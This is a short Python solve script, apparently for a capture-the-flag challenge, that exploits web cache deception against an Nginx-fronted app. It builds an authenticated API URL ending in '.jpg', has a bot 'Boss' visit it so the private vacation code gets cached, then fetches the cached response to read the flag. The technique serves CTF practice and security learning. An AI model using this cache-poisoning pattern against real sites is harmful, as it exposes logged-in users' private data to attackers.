import requests
import time

# Note: This is a conceptual solve script based on the Cache Poisoning vulnerability.
# The actual exploit requires interaction with the Boss Bot.

BASE_URL = "http://no-one-chilled.alfactf.ru"

def solve():
    # 1. Poisoning URL
    # We use a .jpg extension to trigger Nginx caching.
    poison_url = f"{BASE_URL}/xhr/api/auth/vacation-code/exploit.jpg"
    
    print(f"[*] Send this URL to the Boss: {poison_url}")
    print("[*] Waiting for Boss to visit...")
    
    # In a real scenario, you'd send this via the app's messaging system.
    # time.sleep(10) 
    
    # 2. Retrieving the cached response (containing the Boss's vacation code)
    response = requests.get(poison_url)
    
    if "alfa{" in response.text:
        print("[+] Flag found!")
        print(response.text)
    else:
        print("[-] Flag not found in cache. Ensure the Boss has visited the URL.")

if __name__ == "__main__":
    solve()
